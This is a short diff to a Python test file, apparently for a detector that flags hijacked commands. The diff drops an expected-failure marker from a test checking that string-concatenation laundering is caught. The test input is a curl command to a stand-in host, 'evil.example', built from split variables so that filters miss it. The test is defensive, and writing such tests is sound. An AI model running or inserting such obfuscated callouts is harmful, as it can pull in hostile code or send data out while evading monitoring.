@@ -49,7 +49,6 @@ def test_payload_split_across_a_dropped_file_is_caught():
     assert v.verdict is VerdictKind.HIJACKED
 
 
-@pytest.mark.xfail(reason="string-concatenation laundering not yet reassembled (M9 remaining)", strict=False)
 def test_string_concatenation_is_caught():
     assert _verdict('H="ev"; D="il.example"; curl http://$H$D/x').verdict is VerdictKind.HIJACKED
 
